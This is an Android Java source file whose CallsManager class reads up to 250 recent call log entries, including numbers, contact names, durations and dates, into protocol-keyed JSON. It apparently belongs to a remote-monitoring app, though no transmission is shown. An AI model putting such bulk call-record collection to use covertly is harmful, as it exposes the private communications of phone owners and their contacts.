package com.fason.app.features.calls;

import android.Manifest;
import android.database.Cursor;
import android.provider.CallLog;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

public final class CallsManager {

    private static final int MAX = 250;

    private CallsManager() {}

    public static JSONObject getLogs() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            result.put(Protocol.KEY_CALLS_LIST, list);

            if (!PermissionManager.canIUse(Manifest.permission.READ_CALL_LOG)) {
                result.put(Protocol.KEY_ERROR, "Permission denied");
                return result;
            }

            Cursor cur = FasonApp.getContext().getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC");

            if (cur != null) {
                try {
                    int numIdx = cur.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int durIdx = cur.getColumnIndex(CallLog.Calls.DURATION);
                    int dateIdx = cur.getColumnIndex(CallLog.Calls.DATE);
                    int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);
                    int count = 0;

                    while (cur.moveToNext() && count < MAX) {
                        JSONObject call = new JSONObject();
                        call.put(Protocol.KEY_PHONE_NO, numIdx >= 0 ? cur.getString(numIdx) : "");
                        call.put(Protocol.KEY_NAME, nameIdx >= 0 ? cur.getString(nameIdx) : "");
                        call.put(Protocol.KEY_DURATION, durIdx >= 0 ? cur.getString(durIdx) : "");
                        call.put(Protocol.KEY_DATE, dateIdx >= 0 ? cur.getString(dateIdx) : "");
                        call.put(Protocol.KEY_TYPE, typeIdx >= 0 ? cur.getInt(typeIdx) : -1);
                        list.put(call);
                        count++;
                    }
                } finally {
                    cur.close();
                }
            }
            result.put(Protocol.KEY_TOTAL, list.length());
        } catch (Exception ignored) {}

        return result;
    }
}
